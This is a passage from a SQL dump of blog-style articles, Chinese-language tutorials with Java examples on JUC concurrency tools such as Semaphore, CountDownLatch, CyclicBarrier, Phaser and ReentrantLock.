static void main(String[] args) {\n        final SemaphoreLock lock = new SemaphoreLock();\n\n        for (int i = 0; i < 2; i++) {\n            new Thread() {\n                @Override\n                public void run() {\n                    try {\n                        System.out.println(Thread.currentThread().getName() + \" is Running\");\n                        lock.lock();\n                        System.out.println(Thread.currentThread().getName() + \" get the #SemaphoreLock\");\n                        TimeUnit.SECONDS.sleep(10);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    } finally {\n                        lock.unlock();\n                    }\n                    System.out.println(Thread.currentThread().getName() + \" Released the #SemaphoreLock\");\n                }\n            }.start();\n        }\n    }\n\n    static class SemaphoreLock {\n        private final Semaphore semaphore = new Semaphore(1);\n\n        public void lock() throws InterruptedException {\n            semaphore.acquire();\n        }\n\n        public void unlock() {\n            semaphore.release();\n        }\n    }\n\n    private synchronized static void m() {\n        try {\n            TimeUnit.SECONDS.sleep(10);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n#### 获取信号量时不可被打断\n```java\n/**\n * 获取信号量时不可被打断\n */\npublic class SemaphoreExample3 {\n    public static void main(String[] args) throws InterruptedException {\n        final Semaphore semaphore = new Semaphore(1);\n        Thread t1 = new Thread() {\n            @Override\n            public void run() {\n                try {\n                    semaphore.acquire();\n                    System.out.println(\"into t1\");\n                    TimeUnit.SECONDS.sleep(10);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } finally {\n                    semaphore.release();\n                }\n                System.out.println(\"T1 finished\");\n            }\n        };\n        t1.start();\n\n        TimeUnit.MILLISECONDS.sleep(50);\n\n        Thread t2 = new Thread() {\n            @Override\n            public void run() {\n                try {\n                    // semaphore.acquire(); //可以被中断\n                    semaphore.acquireUninterruptibly(); // 不可被中断\n                }  finally {\n                    semaphore.release();\n                }\n                System.out.println(\"T2 finished\");\n            }\n        };\n        t2.start();\n        TimeUnit.MILLISECONDS.sleep(50);\n        t2.interrupt();// 尝试中断t2\n        System.out.println(\"=====\");\n    }\n}\n```\n#### Semaphore的api\n```java\n/**\n * api\n * {@link Semaphore#drainPermits()} 把许可证全部获取\n * {@link Semaphore#availablePermits()} 当前可用的许可证数量\n * {@link Semaphore#tryAcquire()} 时间内,尝试获取许可证,获取成功返回true\n * {@link Semaphore#hasQueuedThreads()} 等待队列中是否有线程\n * {@link Semaphore#getQueuedThreads()} 获取等待队列中的线程集合\n */\npublic class SemaphoreExample4 {\n    public static void main(String[] args) throws InterruptedException {\n        final MySemaphore semaphore = new MySemaphore(5);\n        Thread t1 = new Thread(\"t1\") {\n            @Override\n            public void run() {\n                try {\n                    semaphore.drainPermits(); // 把许可证全部获取\n                    System.out.println(semaphore.availablePermits()); // 当前可用的许可证数量\n                    TimeUnit.SECONDS.sleep(5);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } finally {\n                    semaphore.release(5);\n                }\n                System.out.println(\"T1 finished\");\n            }\n        };\n        t1.start();\n\n        TimeUnit.MILLISECONDS.sleep(500);\n\n        Thread t2 = new Thread(\"t2\") {\n            @Override\n            public void run() {\n                try {\n                    // semaphore.acquire();\n                    boolean success = semaphore.tryAcquire(1, TimeUnit.SECONDS);// 时间内,尝试获取许可证,获取成功返回true\n                    System.out.println(success ? \"Successful\":\"Failure\");\n                    TimeUnit.SECONDS.sleep(2);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } finally {\n                    semaphore.release();\n                }\n                System.out.println(\"T2 finished\");\n            }\n        };\n        t2.start();\n\n        TimeUnit.MILLISECONDS.sleep(500);\n        System.out.println(semaphore.hasQueuedThreads()); // 等待队列中是否有线程\n        Collection<Thread> waitingThreads = semaphore.getWaitingThreads(); // 等待队列中的线程集合\n        for (Thread t : waitingThreads) {\n            System.out.println(\"waitThread: \" + t.getName()); // t2\n        }\n    }\n\n    static class MySemaphore extends Semaphore {\n\n        public MySemaphore(int permits) {\n            super(permits);\n        }\n\n        public MySemaphore(int permits, boolean fair) {\n            super(permits, fair);\n            super.getQueuedThreads();\n        }\n\n        public Collection<Thread> getWaitingThreads() {\n            return super.getQueuedThreads();\n        }\n    }\n}\n```', 0, 0, 66, 0, 0, '2020-07-03 23:31:19', '2020-07-03 23:31:19', 0, 0);
INSERT INTO `article` VALUES (95, 1, 'JUC-CoutnDownLatch、CyclicBarrier、Phaser', '2019/10/1571033368_mmexport1570975373967.jpg', '### CountDownLatch\n```java\n// CountDownLatch\n(1) 一个线程或多个线程一直等待,直到其他线程完成的操作完成\n(2) CountDownLatch用了一个给定的计数器来进行初始化,该计数器的操作是原子操作,同时只能有一个线程去操作该计数器\n(3) 调用该类await方法的线程会一直处于阻塞状态,直到其他线程调用countDown方法使当前计数器的值变成0\n(4) 每次调用countDown的时候,计数器的值会减一\n(5) 到计数器的值减到0的时候,所有因调用await的方法而处于等待状态的线程就会继续往下执行\n(6) 这种操作只会出现一次,因为这里的计数器是不能重置的\n(7) 如果业务上需要一个可以重置计数次数的版本,可以考虑JUC的另一个组件CyclicBarrier。\n\n// CountDownLatch应用场景\n(1) 主线程等待所有子线程任务完成\n(2) A线程等待B线程做完某操作后继续执行\n(3) 多个线程共同执行一阶段任务后再共同执行下一阶段任务,反复;实现较为繁琐\n\n// 注意事项\n(1) 使用时给定计数器\n(2) 每次线程任务执行完时调用countDown\n(3) 并发模拟可以使用CountDownLatch,因为模拟的场景是有5000个请求,每一个分别去执行一个函数,需要等待所有处理的请求处理完再统一它的结果\n(4) 这个结果对应于我们演示时的最终结果,使用CountDownLatch就可以保证这些处理全部处理完才去输出最终的结果\n(5) 过程中每一个请求都可以看作一个子任务\n```\n#### 主线程等待线程池中所有子线程任务完成\n```java\n/**\n * 应用场景\n * 主线程等待线程池中所有子线程任务完成\n */\npublic class CountDownLatchExample1 {\n\n    private static Random random = new Random(System.currentTimeMillis());\n\n    private static ExecutorService executor = Executors.newFixedThreadPool(2);\n\n    private static final CountDownLatch latch = new CountDownLatch(10);\n\n    public static void main(String[] args) throws InterruptedException {\n        int[] data = query();\n        for (int i = 0; i < data.length; i++) {\n            executor.execute(new SimpleRunnable(data, i, latch));\n        }\n        // 阻塞等待所有任务完成,直到CountDownLatch到达0,表示所有线程任务完成\n        latch.await();\n        System.out.println(\"all of work finish done.\");\n        executor.shutdown(); // shutdown方法是异步的\n        executor.awaitTermination(1, TimeUnit.HOURS);// Blocks,直到线程池所有任务完成或超时\n    }\n\n    static class SimpleRunnable implements Runnable {\n\n        private final int[] data;\n\n        private final int index;\n\n        private final CountDownLatch latch;\n\n        SimpleRunnable(int[] data, int index, CountDownLatch latch) {\n            this.data = data;\n            this.index = index;\n            this.latch = latch;\n        }\n\n        @Override\n        public void run() {\n            try {\n                Thread.sleep(random.nextInt(2_000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            int value = data[index];\n            if (value % 2 == 0) {\n                data[index] = value * 2;\n            } else {\n                data[index] = value * 10;\n            }\n            System.out.println(Thread.currentThread().getName()+ \"finished.\");\n            // 线程任务完成是进行countDown,每次调用countDown(),CountDownLatch的计数减1\n            latch.countDown();\n        }\n    }\n\n    private static int[] query() {\n        return new int[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n    }\n}\n```\n#### A线程等待B线程做完某操作后继续执行\n```java\n/**\n * 应用场景\n *  A线程等待B线程做完某操作后继续执行\n */\npublic class CountDownLatchExample2 {\n    public static void main(String[] args) throws InterruptedException {\n        final CountDownLatch latch = new CountDownLatch(1);\n\n        new Thread() {\n            @Override\n            public void run() {\n                System.out.println(\"Do some initial working.\");\n                try {\n                    Thread.sleep(1_000);\n                    latch.await();\n                    System.out.println(\"Do other working..\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }.start();\n\n        new Thread() {\n            @Override\n            public void run() {\n                try {\n                    System.out.println(\"async prepare for some data.\");\n                    Thread.sleep(2_000);\n                    System.out.println(\"data prepare for done.\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } finally {\n                    latch.countDown();\n                }\n            }\n        }.start();\n\n        new Thread() {\n            @Override\n            public void run() {\n                try {\n                    latch.await();\n                    System.out.println(\"release.\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }.start();\n\n        Thread.currentThread().join();\n    }\n}\n```\n#### 多个线程共同执行一阶段任务后再共同执行下一阶段任务,反复\n```java\n/**\n * 应用场景\n *  多个线程共同执行一阶段任务后再共同执行下一阶段任务,反复\n */\npublic class CountDownLatchExample4 {\n\n    private static Random random = new Random(System.currentTimeMillis());\n\n    static class Event{\n        int id = 0;\n        public Event(int id) {\n            this.id = id;\n        }\n    }\n\n    interface Watcher {\n        // void startWatch();\n\n        void done(Table table);\n    }\n\n    static class TaskBatch implements Watcher{\n\n        private CountDownLatch countDownLatch;\n\n        private TaskGroup taskGroup;\n\n        public TaskBatch(int size, TaskGroup taskGroup) {\n            this.taskGroup = taskGroup;\n            this.countDownLatch = new CountDownLatch(size);\n        }\n\n        /*@Override\n        public void startWatch() {\n            countDownLatch.countDown();\n        }*/\n\n        @Override\n        public void done(Table table) {\n            countDownLatch.countDown();\n            if (countDownLatch.getCount() == 0) {\n                System.out.println(\"The table \" + table.tableName + \" finished work;{\"+ table +\"}\");\n                taskGroup.done(table);\n            }\n        }\n    }\n\n    static class TaskGroup implements Watcher {\n        private CountDownLatch countDownLatch;\n\n        private Event event;\n\n        public TaskGroup(int size, Event e) {\n            this.event = e;\n            this.countDownLatch = new CountDownLatch(size);\n        }\n\n        @Override\n        public void done(Table table) {\n            countDownLatch.countDown();\n            if (countDownLatch.getCount() == 0) {\n                System.out.println(\"=======All of table done in event:\" + event.id);\n            }\n        }\n    }\n\n    static class Table {\n        String tableName;\n        long sourceRecordCount = 10;\n        long targetCount;\n        String sourceColumnSchema = \"<table name=\'a\'><column name=\'col1\' type=\'varchar2\'></column></table>\";\n        String targetColumnSchema = \"\";\n\n        public Table(String tableName, long sourceRecordCount) {\n            this.tableName = tableName;\n            this.sourceRecordCount = sourceRecordCount;\n        }\n\n        @Override\n        public String toString() {\n            return \"Table{\" +\n                    \"tableName=\'\" + tableName + \'\\\'\' +\n                    \", sourceRecordCount=\" + sourceRecordCount +\n                    \", targetCount=\" + targetCount +\n                    \", sourceColumnSchema=\'\" + sourceColumnSchema + \'\\\'\' +\n                    \", targetColumnSchema=\'\" + targetColumnSchema + \'\\\'\' +\n                    \'}\';\n        }\n    }\n\n    private static List<Table> capture(Event event) {\n        ArrayList<Table> list = new ArrayList<>();\n        for (int i = 0; i < 10; i++) {\n            list.add(new Table(\"table-\"+event.id + \"-\" + i, i * 1000));\n        }\n        return list;\n    }\n\n    public static void main(String[] args) {\n        Event[] events = {new Event(1), new Event(2)};\n        ExecutorService executorService = Executors.newFixedThreadPool(5);\n        for (Event event : events) {\n            List<Table> tables = capture(event);\n            TaskGroup taskGroup = new TaskGroup(tables.size(), event);\n            for(Table table : tables) {\n                TaskBatch taskBatch = new TaskBatch(2, taskGroup);\n                TrustSourceColumns columnsRunnable = new TrustSourceColumns(table, taskBatch);\n                TrustSourceRecordCount recordCountRunnable = new TrustSourceRecordCount(table, taskBatch);\n\n                executorService.submit(columnsRunnable);\n                executorService.submit(recordCountRunnable);\n            }\n        }\n    }\n\n    static class TrustSourceRecordCount implements Runnable {\n        private final Table table;\n        private final TaskBatch taskBatch;\n\n        TrustSourceRecordCount(Table table, TaskBatch taskBatch) {\n            this.table = table;\n            this.taskBatch = taskBatch;\n        }\n        @Override\n        public void run() {\n            try {\n                Thread.sleep(random.nextInt(10000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            table.targetCount = table.sourceRecordCount;\n            // System.out.println(\"The table \" + table.tableName + \"target record count Capture done and update the data\");\n            taskBatch.done(table);\n        }\n    }\n\n    static class TrustSourceColumns implements Runnable {\n\n        private final Table table;\n\n        private final TaskBatch taskBatch;\n\n        TrustSourceColumns(Table table, TaskBatch taskBatch) {\n            this.table = table;\n            this.taskBatch = taskBatch;\n        }\n\n        @Override\n        public void run() {\n            try {\n                Thread.sleep(random.nextInt(10000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            table.targetColumnSchema = table.sourceColumnSchema;\n            // System.out.println(\"The table \" + table.tableName + \"target columns Capture done and update the data\");\n            taskBatch.done(table);\n        }\n    } \n}\n```\n### CyclicBarrier\n```java\n// CyclicBarrier\n(1) 它允许一组线程相互等待,直到某个公共的屏障点\n(2) 通过它可以完成多个线程之间相互等待只有当每个线程都准备就绪,才能各自继续往下执行后续的操作\n(3) 它和CountDownLatch有些相似的地方,都是通过计数器实现的\n(4) 当某个线程调用了await方法时,这个线程就进入了等待状态,计数器执行时+1,(这点和countDown相反)\n(5) 当前计数器值达到初始值的时*,因为调用await进入等待状态的线程会被唤醒继续执行它们后续的操作\n(6) 由于CyclicBarrier在释放等待线程后可以被重用,所以又称它为循环屏障,可以一直循环使用\n\n// CyclicBarrier应用场景\n(1) 多个线程相互等待直到所有线程任务完成\n(2) 像CountDownLatch一样等待所有子线程任务完成,但运用了回调事件通知\n\n// CountDownLatch与CyclicBarrier区别\n(1) CountDownLatch不能reset,而CyclicBarrier是可以循环使用的\n(2) CyclicBarrier中工作线程之间互相等待,没有中间人进行await,去中心化\n(3) CountDownLatch需要一个线程执行await进行任务完成操作\n```\n#### 多个线程相互等待直到所有线程任务完成\n```java\n/**\n * 应用场景\n *  多个线程相互等待直到所有线程任务完成\n * */\npublic class CyclicBarrierExample1 {\n    public static void main(String[] args) throws BrokenBarrierException, InterruptedException {\n        CyclicBarrier cyclicBarrier = new CyclicBarrier(2, new Runnable(){\n            // 当Parties满足时调用,可以实现像CountDownLatch一样等待所有子线程任务完成,但运用了回调事件通知\n            @Override\n            public void run() {\n                System.out.println(\"callback all of finish\");\n            }\n        });\n        new Thread() {\n            @Override\n            public void run() {\n                try {\n                    TimeUnit.SECONDS.sleep(3);\n                    System.out.println(\"T1 finished\");\n                    cyclicBarrier.await();\n                    // cyclicBarrier.await(1, TimeUnit.SECONDS); 等待超时\n                    System.out.println(\"T1 The other thread finished too.\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } catch (BrokenBarrierException e) {\n                    e.printStackTrace();\n                }\n            }\n        }.start();\n\n        new Thread() {\n            @Override\n            public void run() {\n                try {\n                    TimeUnit.SECONDS.sleep(6);\n                    System.out.println(\"T2 finished\");\n                    cyclicBarrier.await();\n                    System.out.println(\"T2 The other thread finished too.\");\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } catch (BrokenBarrierException e) {\n                    e.printStackTrace();\n                }\n            }\n        }.start();\n        System.out.println(cyclicBarrier.getNumberWaiting()); // 0->1->0 进入wait等待的线程数量\n        System.out.println(cyclicBarrier.getParties()); // 2 创建时Parties的数量\n        System.out.println(cyclicBarrier.isBroken());// false 某线程cyclicBarrier.await时是否中断或出现等待超时\n        // reset = initial = finished\n        cyclicBarrier.reset(); // 重置,重置后相当于初始化的状态,相当于最终完成的状态,说明CyclicBarrier可以多次重用\n        TimeUnit.MILLISECONDS.sleep(4_000);\n    }\n}\n```\n### Phaser\n```java\n// Phaser\n(1) 阶段器,它可以实现CountDownLatch的功能,且比CountDownLatch更强大\n(2) 它可以动态调整计数器值parties\n(3) Phaser将多个线程协作执行的任务划分为多个阶段，每个阶段都可以有任意个参与者，线程可以随时注册并参与到某个阶段或退出注册某个阶段\n\n// 应用场景\n(1) 主线程等待所有子线程任务完成\n(2) 多个线程执行分阶段性质的任务,每个阶段结束后停留等待所有线程结束进行统计处理,随后再进行下个阶段任务\n(3) 多个子线程执行公共的任务结束后,不进入阻塞,而是通知主线程自己任务完成后,继续执行自己的独立任务\n\n```\n#### 主线程等待所有子线程任务完成\n```java\n/**\n * 应用场景\n *  主线程等待所有子线程任务完成\n *  相比于CountDownLatch,Phaser可以自行调节parties的数量\n *  {@link Phaser#register()} 动态增加parties数量\n *  {@link Phaser#arriveAndAwaitAdvance()} 到达并等待本轮parties满足\n */\npublic class PhaserExample1 {\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    public static void main(String[] args) {\n        final Phaser phaser = new Phaser();\n        IntStream.rangeClosed(1, 5).boxed().map(i -> phaser).forEach(Task::new);\n        phaser.register();// 动态增加parties数量\n        phaser.arriveAndAwaitAdvance(); // 最后一个注册最后一个被唤醒等待\n        System.out.println(\"all of worker finished the task.\");\n        // IntStream.rangeClosed(1, 5).boxed().map(i -> phaser).forEach(Task::new);\n    }\n\n    static class Task extends Thread {\n        private final Phaser phaser;\n        Task(Phaser phaser) {\n            this.phaser = phaser;\n            this.phaser.register();\n            start();\n        }\n\n        @Override\n        public void run() {\n            System.out.println(\"The Worker {\" + getName() + \"] is working...\");\n            try {\n                TimeUnit.SECONDS.sleep(random.nextInt(5));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            phaser.arriveAndAwaitAdvance();\n        }\n    }\n}\n```\n```java\n/**\n * 应用场景\n *  主线程等待所有子线程任务完成\n * {@link Phaser#awaitAdvance(int)} 监视等待着参数phase轮的parties满足\n * {@link Phaser#arrive()} 到达,但不阻塞等待其他线程完成任务\n */\npublic class PhaserExample6 {\n\n    public static void main(String[] args) throws InterruptedException {\n        final Phaser phaser = new Phaser(6);\n        IntStream.rangeClosed(1, 6).boxed().map(i -> phaser).forEach(AwaitAdvanceTask::new); // 6个\n\n        phaser.awaitAdvance(phaser.getPhase()); // 监视等待着目前phase轮的Parties结束\n        System.out.println(\"===================\");\n    }\n\n    private static class AwaitAdvanceTask extends Thread {\n        private final Phaser phaser;\n        AwaitAdvanceTask(Phaser phaser) {\n            this.phaser = phaser;\n            start();\n        }\n\n        @Override\n        public void run() {\n            try {\n                TimeUnit.SECONDS.sleep(5);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(getName() + \" finished work.\");\n            phaser.arrive(); // 到达\n        }\n    }\n}\n```\n\n#### 多个线程执行分阶段性质的任务,每个阶段结束后停留等待所有线程结束进行统计处理,随后再进行下个阶段任务\n```java\n/**\n * 应用场景\n *  多个线程执行分阶段性质的任务,每个阶段结束后停留等待所有线程结束进行统计处理,随后再进行下个阶段任务\n */\npublic class PhaserExample2 {\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    /**\n     * 铁人三项\n     * 1阶段 赛跑 等待所有人结束\n     * 2阶段 骑自行车,等待所有人结束\n     * 3阶段 跳远,等待所有结束\n     * 每当parties满足时,完成一轮phaser,phaser就会+1\n     * running\n     * bicycle\n     * long jump\n     * @param args\n     */\n    public static void main(String[] args) {\n        // 5个parties,5个都到达时完成一轮phaser\n        final Phaser phaser = new Phaser(5) {\n            @Override\n            protected boolean onAdvance(int phase, int registeredParties) {\n                System.err.println(registeredParties);\n                return false;\n            }\n        };\n        for (int i = 1; i < 6; i++) {\n            new Athletes(i, phaser).start();\n        }\n    }\n\n    static class Athletes extends Thread {\n        private final int no;\n        private final Phaser phaser;\n        Athletes(int no, Phaser phaser) {\n            this.no = no;\n            this.phaser = phaser;\n        }\n\n        @Override\n        public void run() {\n            try {\n                System.out.println(no + \": start running...\");\n                TimeUnit.SECONDS.sleep(random.nextInt(5));\n                System.out.println(no + \":  end running\");\n                System.out.println(\"getPhase()=>\" + phaser.getPhase()); // 0\n                phaser.arriveAndAwaitAdvance(); // 到达并等待\n\n\n                System.out.println(no + \": start bicycle.\");\n                TimeUnit.SECONDS.sleep(random.nextInt(5));\n                System.out.println(no + \":  end bicycle\");\n                System.out.println(\"getPhase()=>\" + phaser.getPhase()); // 1\n                phaser.arriveAndAwaitAdvance();\n\n                System.out.println(no + \": start long jump.\");\n                TimeUnit.SECONDS.sleep(random.nextInt(5));\n                System.out.println(no + \":  end long jump\");\n                System.out.println(\"getPhase()=>\" + phaser.getPhase());// 2\n                phaser.arriveAndAwaitAdvance();\n\n                System.out.println(\"finished phase: \" + phaser.getPhase());// 3\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n        }\n    }\n}\n```\n#### 多个线程执行分阶段性质的任务,特殊情况,某个线程中途崩溃退出或放弃执行下一阶段\n```java\n/**\n * 应用场景\n *  多个线程执行分阶段性质的任务,每个阶段结束后停留等待所有线程结束进行统计处理,随后再进行下个阶段任务\n *  特殊情况,某个线程中途崩溃退出或放弃执行下一阶段\n */\npublic class PhaserExample3 {\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    /**\n     * 铁人三项\n     *  某个线程中途出现了异常中断或使不进行下阶段任务\n     *  当某个线程在中途放弃时可以调用 {@link Phaser#arriveAndDeregister()} 到达并退出注册,使parties-1\n     *  这样其他线程就不会等待它,从而进行下一个阶段任务\n     * @param args\n     */\n    public static void main(String[] args) {\n        final Phaser phaser = new Phaser(5);\n        for (int i = 1; i < 5; i++) {\n            new Athletes(i, phaser).start();\n        }\n        new InjuredAthletes(5, phaser).start();\n    }\n\n    static class InjuredAthletes extends Thread {\n        private final int no;\n        private final Phaser phaser;\n        InjuredAthletes(int no, Phaser phaser) {\n            this.no = no;\n            this.phaser = phaser;\n        }\n\n        @Override\n        public void run() {\n            try {\n                sport(no, phaser, \": start running...\", \":  end running\");\n\n\n                sport(no, phaser, \": start bicycle.\", \":  end bicycle\");\n\n                System.out.println(no + \" Oh shit, i am injured, i will be exited.\");\n                phaser.arriveAndDeregister(); //达到并退出注册 当前线程不进行下一阶段任务了\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    static class Athletes extends Thread {\n        private final int no;\n        private final Phaser phaser;\n        Athletes(int no, Phaser phaser) {\n            this.no = no;\n            this.phaser = phaser;\n        }\n\n        @Override\n        public void run() {\n            try {\n                sport(no, phaser, \": start running...\", \":  end running\");\n\n\n                sport(no, phaser, \": start bicycle.\", \":  end bicycle\");\n\n                sport(no, phaser, \": start long jump.\", \":  end long jump\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n    private static void sport(int no, Phaser phaser, String s, String s2) throws InterruptedException {\n        System.out.println(no + s);\n        TimeUnit.SECONDS.sleep(random.nextInt(5));\n        System.out.println(no + s2);\n        phaser.arriveAndAwaitAdvance();\n    }\n}\n```\n#### 多个子线程执行公共的任务结束后,不进入阻塞,而是通知主线程自己任务完成后,继续执行自己的独立任务\n```java\n/**\n * 应用场景\n *  多个子线程执行公共的任务结束后,不进入阻塞,而是通知主线程自己任务完成后,继续执行自己的独立任务\n * {@link Phaser#arrive()} 到达但不等待\n */\npublic class PhaserExample5 {\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    // arrive 到达但不等待\n    public static void main(String[] args) throws InterruptedException {\n        /*final Phaser phaser = new Phaser();\n        new Thread(phaser::arrive).start();\n        TimeUnit.SECONDS.sleep(4);*/\n        final Phaser phaser = new Phaser(5);\n        for (int i = 0; i < 4; i++) {\n            new ArriveTask(phaser, i).start();\n        }\n        phaser.arriveAndAwaitAdvance();\n        System.out.println(\"The phase 1 work finished done.\");\n    }\n\n    private static class ArriveTask extends Thread {\n        private final Phaser phaser;\n        private ArriveTask(Phaser phaser, int no) {\n            super(String.valueOf(no));\n            this.phaser = phaser;\n        }\n        @Override\n        public void run() {\n            System.out.println(getName() + \" start working..\");\n            PhaserExample5.sleepSeconds();\n            System.out.println(getName() + \" The phase one is running.\");\n            phaser.arrive(); // 完成了公共任务\n            PhaserExample5.sleepSeconds();\n            System.out.println(getName() + \" keep to do other thing.\"); // 做自己的任务\n        }\n    }\n\n    private static void sleepSeconds() {\n        try {\n            TimeUnit.SECONDS.sleep(random.nextInt(5));\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n#### 获取Parties数量\n```java\n/**\n * api\n * {@link Phaser#getRegisteredParties()} 获取当前注册的Parties数量\n * {@link Phaser#getArrivedParties()} 获得当前phase阶段已到达的Parties数量\n * {@link Phaser#getUnarrivedParties()} 获得当前phase阶段未到达的Parties数量\n */\npublic class PhaserExample4 {\n    public static void main(String[] args) throws InterruptedException {\n        // final Phaser phaser = new Phaser(1);\n        // 每次parties满足,phase+1\n        /*System.out.println(phaser.getPhase());\n\n        phaser.arriveAndAwaitAdvance();\n        System.out.println(phaser.getPhase());\n\n        phaser.arriveAndAwaitAdvance();\n        System.out.println(phaser.getPhase());\n\n        phaser.arriveAndAwaitAdvance();\n        System.out.println(phaser.getPhase());*/\n\n/*       System.out.println(phaser.getRegisteredParties()); // 获取当前注册的Parties数量\n       phaser.register();\n       System.out.println(phaser.getRegisteredParties());\n       phaser.register();\n       System.out.println(phaser.getRegisteredParties());*/\n\n        /*System.out.println(phaser.getArrivedParties()); // 获得当前phase阶段已到达的Parties数量\n        System.out.println(phaser.getUnarrivedParties()); // 获得当前phase阶段未到达的Parties数量*/\n\n/*      phaser.bulkRegister(10); // 一次性注册10个Parties\n        System.out.println(phaser.getRegisteredParties()); // 11\n        System.out.println(phaser.getArrivedParties()); // 0\n        System.out.println(phaser.getUnarrivedParties()); // 11\n        new Thread(phaser::arriveAndAwaitAdvance).start();\n        TimeUnit.SECONDS.sleep(1);\n        System.out.println(phaser.getRegisteredParties()); // 11\n        System.out.println(phaser.getArrivedParties()); // 1\n        System.out.println(phaser.getUnarrivedParties()); // 10*/\n\n        final Phaser phaser = new Phaser(2) {\n            // phaser是否终结结束\n            @Override\n            protected boolean onAdvance(int phase, int registeredParties) {\n                System.err.println(registeredParties);\n                return false; // true:会导致Phaser当parties满足一次阶段时就会进行销毁,不会继续使用\n                // false: 阻塞等待parties满足,使得Phaser可以多个阶段重复使用\n            }\n        };\n\n        new OnAdvanceTask(\"Alex\", phaser).start();\n        new OnAdvanceTask(\"Jack\", phaser).start();\n        TimeUnit.SECONDS.sleep(3);\n        System.out.println(phaser.getArrivedParties()); // 1\n        System.out.println(phaser.getUnarrivedParties()); // 1\n\n    }\n\n    static class OnAdvanceTask extends Thread {\n        private final Phaser phaser;\n        OnAdvanceTask(String name, Phaser phaser) {\n            super(name);\n            this.phaser = phaser;\n        }\n\n        @Override\n        public void run() {\n            System.out.println(getName() + \" I am start and the phaser \" + phaser.getPhase());\n            phaser.arriveAndAwaitAdvance();\n            System.out.println(getName() + \"I am end! \" + phaser.getPhase());\n\n            System.out.println(\"isTerminated->\" + phaser.isTerminated()); // phaser是否销毁\n\n            try {\n                TimeUnit.SECONDS.sleep(1);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            if (\"Alex\".equals(getName())) {\n                System.out.println(getName() + \" I am start and the phaser \" + phaser.getPhase());\n                phaser.arriveAndAwaitAdvance();\n                System.out.println(getName() + \" I am end!\");\n            }\n\n        }\n    }\n}\n```\n#### 等待超时处理\n```java\n/**\n * api\n * {@link Phaser#awaitAdvanceInterruptibly } 等待当前phase阶段parties到达满足,途中被中断或超时时抛出异常\n */\npublic class PhaserExample7 {\n    public static void main(String[] args) throws InterruptedException {\n        final Phaser phaser = new Phaser(3);\n        Thread thread = new Thread(()->{\n            try {\n                phaser.awaitAdvanceInterruptibly(phaser.getPhase(), 1, TimeUnit.SECONDS);// 等待当前phase阶段parties到达满足,途中被中断或超时时抛出异常\n                System.out.println(\"Not in the current phase\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            } catch (TimeoutException e2) {\n                e2.printStackTrace();\n            }\n        });\n        thread.start();\n        System.out.println(\"=========================\");\n        TimeUnit.SECONDS.sleep(10);\n        thread.interrupt();\n        System.out.println(\"==========thread.interrupt==========\");\n    }\n}\n```\n#### 中断销毁Phaser\n```java\n/**\n * api\n * 中断Phaser\n * {@link Phaser#forceTermination() } 中断销毁Phaser\n * {@link Phaser#isTerminated()} 改Phaser是否已中断销毁\n */\npublic class PhaserExample8 {\n    public static void main(String[] args) throws InterruptedException {\n        final Phaser phaser = new Phaser(3);\n\n        new Thread(phaser::arriveAndAwaitAdvance).start();\n\n        TimeUnit.SECONDS.sleep(3);\n        System.out.println(phaser.isTerminated());\n        phaser.forceTermination();\n        System.out.println(phaser.isTerminated());\n    }\n}\n```', 0, 0, 82, 0, 0, '2020-07-03 14:09:40', '2020-07-03 14:09:40', 0, 0);
INSERT INTO `article` VALUES (96, 1, 'JUC-ReentranLock、ReentrantReadWriteLock、StampedLock', '2019/10/1570088036_mmexport1570087996741.jpg', '### ReentranLock\n```java\n// ReentranLock\n(1) ReentrantLock需要手动声明加锁和释放锁,为了避免手动释放锁造成死锁,所以一定是在finally中释放锁,\n(2) ReentrantLock性能优于synchronized,但synchronized也在版本迭代中不断的进行优化\n(3) 锁的细粒度和灵活度:ReentrantLock优于synchronized,使得开发者可以编写自己的需求实现\n(4) 可指定是公平锁还是非公平锁,而synchronized只能是非公平锁(所谓公平锁就是先等待的线程先获得锁,但不是绝对公平)\n(5) 提供了一个Condition类,可以分组唤醒需要唤醒的线程,而synchronized要么随机唤醒一个线程,要么唤醒全部线程\n(6) 提供能够中断等待锁的线程的机制,lock.lockInterruptibly()。\n如果当前线程没有被中断的话,获取锁定。\n如果已经被中断了抛出异常。\n(7) ReentrantLock实现是一种自旋锁,通过循环调用CAS原子性操作实现加锁\n\n```\n#### 像synchronized一样使用\n```java\n/**\n * ReentrantLock 显式锁\n * {@link ReentrantLock(boolean)} 是否是公平锁,默认false\n * {@link ReentrantLock#lock()} 获取锁,阻塞\n * {@link ReentrantLock#tryLock} 尝试获取锁,获取成功返回true\n * {@link ReentrantLock#lockInterruptibly()} 获取锁,途中可以被中断\n * {@link ReentrantLock#unlock()} 释放锁\n * {@link ReentrantLock#hasQueuedThreads()} waitingQueue等待队列中是否有线程\n * {@link ReentrantLock#getQueueLength()} waitingQueue等待队列中的线程数量\n * {@link ReentrantLock#hasQueuedThread(Thread)()} 某线程是否在等待队列中\n * {@link ReentrantLock#isLocked()} 